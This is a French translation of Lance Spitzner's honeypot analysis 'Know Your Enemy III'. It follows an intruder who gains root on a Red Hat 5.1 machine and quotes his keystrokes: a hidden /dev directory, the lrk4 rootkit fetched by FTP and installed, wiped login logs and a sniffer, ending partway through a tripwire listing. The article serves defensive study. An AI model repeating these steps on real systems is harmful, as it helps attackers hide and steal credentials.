<html xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 9">
<meta name=Originator content="Microsoft Word 9">
<link rel=File-List href="./KYE3_files/filelist.xml">
<title>Know Your Enemy III: Ils ont obtenu le statut root </title>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Author>none</o:Author>
  <o:LastAuthor>Everett Spitzner</o:LastAuthor>
  <o:Revision>2</o:Revision>
  <o:TotalTime>10</o:TotalTime>
  <o:Created>2000-01-07T03:55:00Z</o:Created>
  <o:LastSaved>2000-01-07T03:55:00Z</o:LastSaved>
  <o:Pages>4</o:Pages>
  <o:Words>2165</o:Words>
  <o:Characters>12346</o:Characters>
  <o:Company> </o:Company>
  <o:Lines>102</o:Lines>
  <o:Paragraphs>24</o:Paragraphs>
  <o:CharactersWithSpaces>15161</o:CharactersWithSpaces>
  <o:Version>9.2720</o:Version>
 </o:DocumentProperties>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:HyphenationZone>21</w:HyphenationZone>
  <w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>
  <w:DisplayVerticalDrawingGridEvery>0</w:DisplayVerticalDrawingGridEvery>
  <w:UseMarginsForDrawingGridOrigin/>
  <w:Compatibility>
   <w:FootnoteLayoutLikeWW8/>
   <w:ShapeLayoutLikeWW8/>
   <w:AlignTablesRowByRow/>
   <w:ForgetLastTabAlignment/>
   <w:LayoutRawTableWidth/>
   <w:LayoutTableRowsApart/>
  </w:Compatibility>
 </w:WordDocument>
</xml><![endif]-->
<style>
<!--
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0in;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:11.0pt;
	mso-bidi-font-size:10.0pt;
	font-family:Arial;
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";
	mso-ansi-language:FR;}
p.MsoPlainText, li.MsoPlainText, div.MsoPlainText
	{margin:0in;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";
	mso-ansi-language:FR;}
@page Section1
	{size:595.3pt 841.9pt;
	margin:56.7pt .8in 42.55pt .8in;
	mso-header-margin:0in;
	mso-footer-margin:.5in;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
-->
</style>
</head>

<body lang=EN-US style='tab-interval:35.4pt'>

<div class=Section1>

<div style='border:solid windowtext .5pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>

<p class=MsoPlainText style='text-align:justify;border:none;mso-border-alt:
solid windowtext .5pt;padding:0in;mso-padding-alt:1.0pt 4.0pt 1.0pt 4.0pt'><span
lang=FR style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:Arial'>Cet
article a été traduit de l’anglais par OUAH (OUAH_hotmail.com),
http://www.multimania.com/ouah. La version originale est de Lance Spitzner
(lspitz@ksni.net) et peut-être obtenue à http://www.enteract.net/~lspitz.<span
style="mso-spacerun: yes">  </span>Pour tout commentaire, venez sur le channel
de<span style="mso-spacerun: yes">  </span>hacking français&nbsp;: #root sur
irc.kewl.org<o:p></o:p></span></p>

</div>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='font-size:16.0pt;mso-bidi-font-size:10.0pt;
font-family:Arial'>Know Your Enemy III</span></b><span lang=FR
style='font-size:16.0pt;mso-bidi-font-size:10.0pt;font-family:Arial'>: Ils ont
obtenu le statut root <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Cet article est la troisième partie d'une série se
concentrant sur le script kiddie.<span style="mso-spacerun: yes">  </span>Le
premier article parlait de<span style="mso-spacerun: yes">  </span>la façon
dont les script kiddies scannent, identifient, et exploitent des
vulnérabilités.<span style="mso-spacerun: yes">  </span>Le deuxième article se
concentre sur la façon dont vous pouvez détecter ces tentatives, identifier
quels outils ils utilisent et quelles vulnérabilités ils recherchent.<span
style="mso-spacerun: yes">  </span>Cet article, le troisième, se concentre sur
ce qui se produit une fois qu'ils obtiennent le statut root. Spécifiquement,
comment ils cachent leurs traces et ce qu'ils font après.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span lang=FR
style='font-family:Arial'>Qui est le script kiddie?<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Comme nous avons vu dans le premier article, le
script kiddie n'est pas tant une personne, c'est plus une stratégie, la
stratégie du scannage pour une intrusion facile. Il ne recherche pas une
information ou une compagnie particulière, leur<span style="mso-spacerun:
yes">  </span>but est d'obtenir le statut root de la manière la plus facile
possible.<span style="mso-spacerun: yes">  </span>Les hackers font cela en se
concentrant sur un petit nombre d'exploits et puis en recherchant les cibles
sur l'entier du net pour tel exploit.<span style="mso-spacerun: yes"> 
</span>Il ne faut pas<span style="mso-spacerun: yes">  </span>sous-estimer
cette stratégie, car tôt ou tard ils trouveront une machine vulnérable.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Une fois qu'ils ont trouvé un système vulnérable et
qu'ils ont obtenu le statut root, la première chose qu'ils font est d'assurer
leurs arrières.<span style="mso-spacerun: yes">  </span>Ils veulent s'assurer
que vous ne saurez pas que votre système a été hacké et que vous ne pourrez ni
voir ni noter vos actions. Ensuite, ils emploient souvent votre système pour
scaner d'autres réseaux ou surveiller silencieusement le vôtre. Pour avoir une
meilleure compréhension de la façon dont les hackers arrivent à leurs
fins,<span style="mso-spacerun: yes">  </span>nous allons suivre pas à pas les
étapes de compromission d'un système par un hacker utilisant les techniques du
script kiddie. Notre système, appelé mozart, est un ordinatueur Linux avec la
Red Hat 5.1. Le système a été compromis le 27 avril 1999. Plus bas on a
retranscrit les vrais techniques que notre hacker a utilisées, avec les logs du
système et les frappes au clavier<span style="mso-spacerun: yes">  </span>pour
vérifier chaque étape. Tous les logs du système ont été enregistrés sur un
serveur protégé syslog, toutes les frappes ont été capturées avec la technique
du sniffing.<span style="mso-spacerun: yes">  </span>Pour plus d'information
sur la manière dont toutes ces informations ont peu être capturées, jetez un
coup d'oeil sur &quot;To Build a Honeypot&quot;. Dutant tout l'article nous
dirons &quot;il&quot; pour le hacker bien que nous n'avons aucune idée si il
s'agit d'un homme ou d'une femme.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span lang=FR
style='font-family:Arial'>L'exploit<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Le 27 avril à 00:13, notre réseau a été scanné par
l'ordinateur 1Cust174.tnt2.long-branch.nj.da.uu.net pour plusieurs
vulnérabilités dont le bug imap. Notre hacker est venu sans discrétion vu que
chaque ordinateur de notre réseau a été scanné (pour plus d'information sur la
détection et l'analyse des scans, allez voir le deuxième article de cette
série).<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 00:12:25 mozart imapd[939]: connect from
208.252.226.174 <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 00:12:27 bach imapd[1190]: connect from
208.252.226.174 <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 00:12:30 vivaldi imapd[1225]: connect from
208.252.226.174 <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apparemment il a du trouvé quel qui lui plaisait
puisqu'il est revenu à 06:52 et à 16:47 le même jour. Il a comencé avec un
scannage plus complet mais cette fois se fixant seulement sur mozart.<span
style="mso-spacerun: yes">  </span>Il identifia une vulnérabilité et lança une
attaque qui fut couronnée de succès contre mountd, une vulnérabilité
généralement connue pour la Red Hat 5.1.<span style="mso-spacerun: yes"> 
</span>Ici nous voyons dans /var/log/messages le hacker qui obtient le statut
de root. L'outil utilisé était certainement ADMmountd.c ou quelque chose du
style.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 16:47:28 mozart mountd[306]: Unauthorized
access by NFS client 208.252.226.174. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 16:47:28 mozart syslogd: Cannot glue message
parts together <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 16:47:28 mozart mountd[306]: Blocked attempt
of 208.252.226.174 to mount <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P
<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Juste après cette exploit, nous voyons dans /
ar/log/messages le hacker devenir root en se telnetant comme l'user crack0 puis
faisant un su à l'user rewt. Chacun de ces deux comptes ont été ajouté par
l'exploit. Notre hacker a maintenant le contrôle total de notre système.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 16:50:27 mozart login[1233]: FAILED LOGIN 2
FROM<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>1Cust102.tnt1.long-branch.nj.da.uu.net FOR crak, User
not known to the underlying<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>authentication module <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 16:50:38 mozart PAM_pwdb[1233]: (login)
session opened for user crak0 by (uid=0) <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 16:50:38 mozart login[1233]: LOGIN ON ttyp0 BY
crak0 FROM<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>1Cust102.tnt1.long-branch.nj.da.uu.net <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 16:50:47 mozart PAM_pwdb[1247]: (su) session
opened for user rewt by crak0(uid=0)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span lang=FR
style='font-family:Arial'>Cacher ses traces<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Le hacker est maintenant root sur votre système.
Comme nous allons le voir maintenant, la suite pour lui est de s'assurer de ne
pas se faire attrapper. D'abord il regarde s’il y a quelqu'un d'autre sur
l'ordinateur.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>[crak0@mozart /tmp]$ w <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><span style="mso-spacerun: yes">  </span>4:48pm<span
style="mso-spacerun: yes">  </span>up 1 day, 18:27,<span style="mso-spacerun:
yes">  </span>1 user,<span style="mso-spacerun: yes">  </span>load average:
0.00, 0.00, 0.00 <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>USER<span style="mso-spacerun: yes">    
</span>TTY<span style="mso-spacerun: yes">      </span>FROM<span
style="mso-spacerun: yes">              </span>LOGIN@<span style="mso-spacerun:
yes">   </span>IDLE<span style="mso-spacerun: yes">   </span>JCPU<span
style="mso-spacerun: yes">   </span>PCPU<span style="mso-spacerun: yes"> 
</span>WHAT <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>crak0<span style="mso-spacerun: yes">   
</span>ttyp0<span style="mso-spacerun: yes">    </span>1Cust102.tnt1.lo<span
style="mso-spacerun: yes">  </span>4:48pm<span style="mso-spacerun: yes"> 
</span>0.00s<span style="mso-spacerun: yes">  </span>0.23s<span
style="mso-spacerun: yes">  </span>0.04s<span style="mso-spacerun: yes"> 
</span>w <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Après s'être assurer qu'il n'y ait personne à
l'horizon, il voudra cacher tout ce qu'il veut faire.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Ceci nécessite normalement d'enlever n'importe quelle
trace des fichiers logs et de remplacer les exécutables du système, par exemple
pour ps et netstat, par des trojans système, pour que vous ne puissiez voir le
hacker sur votre propre système. Une fois que les trojans ont été installés, le
hacker a obtenu le contrôle total de votre système et vous ne le saurez probablement
jamais. De même qu'il existe des scripts automatiques pour hacker, il y a aussi
des outils automatisés pour cacher les hackers, souvent appelés rootkits. Un
des rootkits les plus connus est lrk4. En exécutant le script, plusieurs
fichiers importants sont remplacés ce qui a pour but de cacher le hacker après
quelques secondes. Pour des informations plus détaillées sur les rootkits,
regardez le fichier README qui accompagne lrk4. Cela vous donnera une meilleure
idée de la façon dont les rootkits fonctionnent en général. Je vous recommande
aussi de regarder &quot;hide and seek&quot;, un document intéressant pour
cacher ses traces.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Quelques minutes après avoir compromis notre système,
nous voyons le hacker downloader le rootkit et implémenter le script avec la
commande &quot;make install&quot;. Ci-dessous, les vrais frappes au clavier que
le hacker a utilisé pour se cacher.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>cd /dev/ <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>su rewt <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>mkdir &quot;. &quot; <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>cd &quot;. &quot; <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>ftp technotronic.com <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>anonymous <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>fdfsfdsdfssd@aol.com <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>cd /unix/trojans <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>get lrk4.unshad.tar.gz <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>quit <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>ls <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>tar -zxvf lrk4.unshad.tar.gz <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>mv lrk4 proc <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>mv proc &quot;. &quot; <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>cd &quot;. &quot; <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>ls <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>make install <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Remarquez que la première chose que notre hacker fit
est de créer le répertoire caché &quot;. &quot; pour cacher son toolkit. Ce
répertoire n'apparait pas<span style="mso-spacerun: yes">  </span>avec la
commande &quot;ls&quot;, et apparais comme le répertoire local avec la commande
&quot;ls -la&quot;. Une façon de localiser le répertoire<span
style="mso-spacerun: yes">  </span>est d'utiliser la commande &quot;find&quot;
(soyez sur que vous ayez en l'intégrité de votre exécutable &quot;find&quot;).<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>mozart #find / -depth -name &quot;*.*&quot; <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>/var/lib/news/.news.daily <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>/var/spool/at/.SEQ <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>/dev/. /. /procps-1.01/proc/.depend <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>/dev/. /. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>/dev/. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Notre hackeur a été quelque peu laborieux en
utilisant des trojans mais a eu une approche simpliste pour effacer les
fichiers logs. Au lieu d'utiliser des outils de nettoyage comme zap2 ou clean,
il a copié le fichier /dev/null sur les fichiers /var/run/utmp et /var/log/utmp
tout en effaçant /var/log/wtmp. Vous savez peut-être que quelque chose ne joue
pas quand<span style="mso-spacerun: yes">  </span>ces fichiers logs ne
contiennent aucune donnée ou si vous obtenez l'erreur suivante:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>[root@mozart sbin]# last -10 <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>last: /var/log/wtmp: No such file or directory <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Perhaps this file was removed by the operator to
prevent logging last info. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>L'étape suivante<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Une fois qu'un système a été compromis, les hackers essayent
de faire un de ces deux choses: Premièrement ils utilisent votre système comme
plateforme de lancement en scannant ou en forçAnt d'autres systèmes. En second
lieu, ils décident d'étendre leur prise en voyant ce qu'ils peuvent apprendre
de votre système comme des comptes sur d'autres systèmes. Notre hacker opta
pour la solution deux. Il implémenta un sniffer sur notre système qui
capturerait tout le trafic de notre réseau y compris les sessions telnet et ftp
sur d'autres systèmes. De cette façon il pourrait connaître les logins et les
passwords. Nous pouvons voir notre système passer en promiscuous mode dans
/var/log/messages peu après l'intrusion.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 17:03:38 mozart kernel: eth0: Setting
promiscuous mode. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Apr 27 17:03:43 mozart kernel: eth0: Setting
promiscuous mode. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Après avoir implémenté les trojans, nettoyé les logs
et exécuté le sniffer notre hacker se déconnecta du système. Cependant, nous le
verrons revenir le lendemain pour retirer les résultats de ses captures du
trafic.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span lang=FR
style='font-family:Arial'>Contrôle des dégâts<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Puisque notre ami s'est déconnecté, cela me donna une
chance de passer en revue le système et de voir ce qui s'était exactement
passé. J'étais extrêmement intéressé de voir ce qui avait été altéré et où il
stockait les informations du sniffeur.<span style="mso-spacerun: yes"> 
</span>D'abord, j'identifiai rapidement avec tripwire quels fichiers avaient
été modifié. Remarque: soyez sur de lancer tripwire depuis une source valide.
J'aime lancer une version statically-linked de tripwire d'un lecteur en lecture
seule. Tripwire montra les choses suivantes:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>added:<span style="mso-spacerun: yes">  
</span>-rw-r--r-- root<span style="mso-spacerun: yes">            </span>5 Apr
27 17:01:16 1999 /usr/sbin/sniff.pid <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>added:<span style="mso-spacerun: yes">  
</span>-rw-r--r-- root<span style="mso-spacerun: yes">          </span>272 Apr
27 17:18:09 1999 /usr/sbin/tcp.log <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -rws--x--x root<span style="mso-spacerun:
yes">        </span>15588 Jun<span style="mso-spacerun: yes">  </span>1
05:49:22 1998 /bin/login <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: drwxr-xr-x root<span style="mso-spacerun:
yes">        </span>20480 Apr 10 14:44:37 1999 /usr/bin <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -rwxr-xr-x root<span style="mso-spacerun:
yes">        </span>52984 Jun 10 04:49:22 1998 /usr/bin/find <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -r-sr-sr-x root<span style="mso-spacerun:
yes">       </span>126600 Apr 27 11:29:18 1998 /usr/bin/passwd <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -r-xr-xr-x root<span style="mso-spacerun:
yes">        </span>47604 Jun<span style="mso-spacerun: yes">  </span>3 16:31:57
1998 /usr/bin/top <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -r-xr-xr-x root<span style="mso-spacerun:
yes">         </span>9712 May<span style="mso-spacerun: yes">  </span>1
01:04:46 1998 /usr/bin/killall <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -rws--s--x root<span style="mso-spacerun:
yes">       </span>116352 Jun<span style="mso-spacerun: yes">  </span>1
20:25:47 1998 /usr/bin/chfn <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -rws--s--x root<span style="mso-spacerun:
yes">       </span>115828 Jun<span style="mso-spacerun: yes">  </span>1
20:25:47 1998 /usr/bin/chsh <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: drwxr-xr-x root<span style="mso-spacerun:
yes">         </span>4096 Apr 27 17:01:16 1999 /usr/sbin <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -rwxr-xr-x root<span style="mso-spacerun:
yes">       </span>137820 Jun<span style="mso-spacerun: yes">  </span>5
09:35:06 1998 /usr/sbin/inetd <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -rwxr-xr-x root<span style="mso-spacerun:
yes">         </span>7229 Nov 26 00:02:19 1998 /usr/sbin/rpc.nfsd <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -rwxr-xr-x root<span style="mso-spacerun:
yes">       </span>170460 Apr 24 00:02:19 1998 /usr/sbin/in.rshd <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -rwxr-x--- root<span style="mso-spacerun:
yes">       </span>235516 Apr<span style="mso-spacerun: yes">  </span>4
22:11:56 1999 /usr/sbin/syslogd <o:p></o:p></span></p>

